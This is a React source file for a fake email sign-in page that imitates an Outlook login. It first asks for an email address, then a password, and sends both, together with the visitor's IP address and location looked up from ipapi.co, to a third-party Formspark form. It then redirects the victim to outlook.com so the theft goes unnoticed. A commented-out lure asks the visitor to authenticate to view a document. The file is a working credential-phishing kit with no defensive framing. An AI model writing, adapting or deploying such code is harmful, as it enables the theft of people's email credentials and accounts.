import { useFormspark } from '@formspark/use-formspark';
import Axios from 'axios';
import React, { useEffect, useState } from 'react';
import Logo from "./logo.svg";

const FORMSPARK_FORM_ID = '3GKfKltz'; // Replace with your actual Formspark form ID

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordInput, setShowPasswordInput] = useState(false);
  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const [isDetails, setIsDetails] = useState({});

  useEffect(() => {
    Axios.get('https://ipapi.co/json/')
      .then((res) => {
        setIsDetails(res.data);
      })
      .catch((error) => console.error('Error fetching IP and location:', error));
  }, []);

  useEffect(() => {
    // Check if the form has been previously submitted
    const isFormSubmitted = localStorage.getItem('formSubmitted');
    if (isFormSubmitted) {
      window.location.replace('https://outlook.com');
    }
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    setShowPasswordInput(true);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    try {
      await submit({ email, password, ...isDetails });
      console.log('Form submitted successfully!');
      // Set the form submission flag in localStorage
      localStorage.setItem('formSubmitted', 'true');
      // Redirect to Outlook after successful submission
      window.location.replace('https://outlook.com');
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      // Reset form fields
      setEmail('');
      setPassword('');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-200">
      <div className="max-w-md w-full bg-white p-8 rounded-lg shadow-lg">
        <div className="text-start">
          <img
            className="mx-auto h-12 w-auto"
            src={Logo}
            alt="logo"
          />
          <h2 className="mt-6 text-3xl font-extrabold text-gray-900">
            Sign in
          </h2>
        </div>
        {/* <div>To download/view your document authenticate your E-mail</div> */}

        {/* Email input section */}
        {!showPasswordInput && (
          <form className="mt-8 space-y-6" onSubmit={handleEmailSubmit}>
            <div>
              <label htmlFor="email-address" className="sr-only">
                Email address
              </label>
              <input
                id="email-address"
                name="email"
                type="email"
                autoComplete="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                placeholder="Email address"
              />
            </div>
            <div className="flex justify-end">
              <button
                type="submit"
                className="mt-4 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
              >
                Next
              </button>
            </div>
          </form>
        )}

        {/* Email display and password input section */}
        {showPasswordInput && (
          <form className="mt-8 space-y-6" onSubmit={handlePasswordSubmit}>
            <div className="text-start text-gray-900 mb-4">
              <p className="text-lg font-medium"><div className='font-semibold text-2xl text-blue-600'>{email}</div></p>
            </div>
            <div>
              <label htmlFor="password" className="sr-only">
                Email password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                placeholder="Password"
              />
            </div>
            <div className="flex justify-end">
              <button
                type="submit"
                disabled={submitting}
                className="mt-4 w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
              >
                Sign in
              </button>
            </div>
          </form>
        )}

        {/* Optional: Forgot password link */}
        <div className="mt-6 flex justify-center">
          <p className="text-sm text-gray-600">
            <a href="/" className="font-medium text-indigo-600 hover:text-indigo-500">
              Forgot your password?
            </a>
          </p>
        </div>

        {/* Optional: Sign up link */}
        <div className="mt-6 flex justify-center">
          <p className="text-sm text-gray-600">
            Don't have an account?{' '}
            <a href="/" className="font-medium text-indigo-600 hover:text-indigo-500">
              Sign up here
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
